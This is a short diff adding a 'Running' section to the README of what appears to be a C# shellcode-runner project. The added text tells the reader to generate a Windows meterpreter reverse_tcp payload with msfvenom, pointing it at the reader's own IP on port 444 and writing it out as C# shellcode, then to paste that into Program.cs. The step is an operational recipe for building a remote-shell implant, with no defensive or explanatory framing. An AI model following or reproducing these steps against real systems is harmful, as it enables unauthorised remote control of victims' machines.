@@ -27,4 +27,9 @@ https://github.com/dotnet/core/blob/master/release-notes/download-archives/2.0.3
 
 ## Running
 
+You're going to need to generate some shell code, so give this a crank;
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=444 -f csharp > shellcode.txt
+```
+Next you need to drop it in to Program.cs
 
